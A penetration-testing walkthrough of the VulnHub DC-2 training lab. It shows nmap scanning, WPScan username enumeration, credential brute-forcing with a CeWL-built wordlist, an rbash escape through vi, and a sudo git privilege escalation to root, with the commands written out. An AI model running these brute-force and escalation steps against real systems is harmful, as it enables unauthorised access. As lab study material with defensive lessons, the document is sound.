# dc-2 walkthrough

# Overview

| Field | Details |
| --- | --- |
| **Machine** | DC-2 |
| **Platform** | VulnHub |
| **Difficulty** | Beginner / Intermediate |
| **Skills** | Web enumeration, WordPress, WPScan, credential brute-forcing, rbash/vi escape, git privilege escalation |
| **Goal** | Find all 5 flags, culminating in root's home directory |

DC-2 is a purposely vulnerable boot-to-root lab designed for beginner penetration testing practice. Basic Linux and command-line skills are required, along with familiarity with tools found in Kali Linux or Parrot Security OS. Root access is required to read the final flag.

# Penetration Testing Methodology

1. Discover target IP
2. Network scanning (Nmap)
3. Add domain name to hosts file
4. Enumerate HTTP service
5. Username enumeration with WPScan
6. Wordlist generation with CeWL
7. WordPress login
8. SSH login
9. Restricted shell escape
10. Locate sudo binary misconfiguration
11. Escalate to root and read final flag

# Reconnaissance

## Host Discovery

```bash
netdiscover
```


Netdiscover results

## Nmap Scan

```bash
nmap -A -p- -sV -T5  <DC-2_IP>  
```

`-p-` scans all 65535 ports.


Nmap results

## Hosts File Configuration

The web application requires a domain name, so it was mapped locally:

```bash
sudo nano /etc/hosts
```

`/etc/hosts` resolves domain names to IP addresses locally.


Editing hosts file


Hosts file entry

# Web Enumeration

Browsed to `http://dc-2/`. A **Flag** link on the site gave a hint toward the next step: the default Kali wordlists would not be sufficient, and a custom wordlist would be needed.


Flag hint on site

## Custom Wordlist with CeWL

```bash
cewl <DC-2_URL> > password 
```

Generates a wordlist from site content, saved to a file named `password`.


CeWL output

## Username Enumeration with WPScan

Since the site runs WordPress:

```bash
wpscan --url <DC-2_URL> -e u
```


WPScan enumeration


WPScan usernames

Three usernames were discovered: `admin`, `jerry`, `tom`, saved to a file named `usernames`.


Saved usernames

## Credential Brute-Force

With a password dictionary (from CeWL) and a username list (from WPScan):

```bash
wpscan --url <DC-2_URL> -U <username_list> -P <password_list>
```


Brute-force run 1


Brute-force run 2

Valid credentials were recovered for both `jerry` and `tom`.

# Initial Access

Logged into WordPress using Jerry's credentials.


WordPress login


WordPress dashboard


Flag 2 found

**Flag 2** was found here, hinting at an alternate entry point into the system.

# Exploitation

The hint pointed to SSH access. Logged in as `tom` on the non-standard port 7744:

```bash
ssh tom@<DC-2_IP> -p 7744
```


SSH login

The shell is a restricted `rbash`, and `tom` can only run four programs from `/bin`; `cat` is unavailable.


Restricted commands

Used `less` (an allowed binary) to read the next flag:

```bash
less flag3.txt
```


Flag 3 via less

## Restricted Shell Escape

`vi` was available, so it was used to break out of `rbash` (technique from GTFOBins):

```bash
vi
:set shell=/bin/bash
:shell
```


Vi shell escape

After escaping, the environment was fixed up to enable normal command execution:

```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
ls
cat flag3.txt
```

## Lateral Movement — Switching to Jerry

Flag 3's hint pointed to switching user to `jerry`:

```bash
su jerry
ls
cat flag4.txt
```


Flag 4 as jerry

# Privilege Escalation

Flag 4 hinted at checking sudo rights:

```bash
sudo -l
```

This revealed `jerry` could run `git` as root without a password. Using the GTFOBins technique for `git`:

```bash
sudo git help config   or sudo git -p help config
!/bin/sh
```


Sudo git escalation

This spawned a root shell. Navigated to `/root` and read the final flag.


Root access and final flag

# Attack Flow

```mermaid
flowchart LR
    A[Host Discovery] --> B[Nmap Scan]
    B --> C[Hosts File Setup]
    C --> D[Web Enumeration]
    D --> E[CeWL Wordlist]
    E --> F[WPScan Username Enum]
    F --> G[Credential Brute-Force]
    G --> H[WordPress Login - Flag 2]
    H --> I[SSH as tom - Flag 3]
    I --> J[rbash Escape via vi]
    J --> K[su jerry - Flag 4]
    K --> L[sudo git Escalation]
    L --> M[Root Access - Final Flag]
```



# Summary of Concepts

- **Host & Service Discovery** — Netdiscover and a full-port Nmap scan (`-p-`) mapped the attack surface, revealing a web service tied to a domain name.
- **Custom Wordlist Generation** — CeWL built a site-specific password dictionary instead of relying on generic wordlists.
- **WordPress Enumeration & Brute-Force** — WPScan enumerated valid usernames and brute-forced credentials using the CeWL-generated dictionary.
- **Restricted Shell (rbash) Escape** — A limited SSH shell was escaped using `vi`'s `:shell` command, a documented GTFOBins technique.
- **Sudo Misconfiguration (git)** — `jerry` had passwordless sudo rights to `git`, which GTFOBins documents as escalatable to a root shell via `git help config`.
- **Lateral Movement** — Flags progressively hinted at pivoting between users (`tom` → `jerry` → `root`) rather than a single direct path to root.

# Tools Used

- netdiscover
- Nmap
- CeWL
- WPScan
- SSH
- vi (GTFOBins escape)
- git (GTFOBins privilege escalation)

# Lessons Learned

- Site content can leak password material — CeWL turning a page into a wordlist shows why generic-sounding text on a login-adjacent site is a real risk.
- Restricted shells (`rbash`) are not a substitute for proper privilege separation; any allowed program with shell-out functionality (editors, pagers, interpreters) can break out.
- Passwordless `sudo` rights on powerful binaries like `git`, even when scoped to a specific subcommand, can be equivalent to full root — always cross-check against GTFOBins during a sudo audit.